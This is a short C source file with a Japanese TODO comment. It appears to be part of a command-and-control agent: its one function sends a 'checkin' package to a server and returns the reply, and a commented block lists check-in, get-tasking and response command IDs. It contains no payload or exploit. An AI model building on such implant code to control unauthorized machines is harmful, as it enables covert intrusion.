#include "checkin.h"

// TODO:commandIDをtranlaterと一致させる。

//comandID =
/*
#define CMD_CHECKIN     0x01
#define CMD_GET_TASKING 0x04
#define CMD_RESPONSE    0x05
*/


PParser sendCheckin(){
    PPackage Checkin = newPackage(TRUE, checkin);

    PParser response = sendAndReceive(Checkin->buffer, Checkin->size);

    freePackage(Checkin);

    if(!response){
        return NULL;
    }

    return response;
}

